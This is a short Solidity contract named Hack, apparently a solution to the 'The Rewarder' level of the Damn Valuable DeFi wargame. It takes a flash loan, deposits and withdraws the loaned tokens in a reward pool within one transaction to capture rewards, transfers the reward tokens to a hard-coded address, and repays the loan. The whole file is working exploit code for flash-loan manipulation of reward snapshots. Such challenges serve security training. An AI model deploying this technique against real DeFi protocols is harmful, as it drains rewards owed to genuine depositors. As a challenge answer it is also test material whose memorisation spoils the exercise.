
pragma solidity ^0.8.0;

import 'hardhat/console.sol';
import "../DamnValuableToken.sol";
import "./RewardToken.sol";



contract Hack {
    IFlashLoanerPool pool;  
    ITheRewarderPool rewardPool;
    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;


    constructor(address _address, address liquidityTokenAddress, address _rewardPool, address _rewardToken) {
        pool = IFlashLoanerPool(_address);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewardPool = ITheRewarderPool(_rewardPool);
        rewardToken = RewardToken(_rewardToken);

    }

    function receiveFlashLoan(uint256 amount) public {
        
        liquidityToken.approve(address(rewardPool), amount);

        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);

        rewardToken.transfer(0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc,rewardToken.balanceOf(address(this)));



        liquidityToken.transfer(address(pool), amount);
    }



    function callFlashLoan(uint256 amount) public {
        pool.flashLoan(amount);
    }
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
}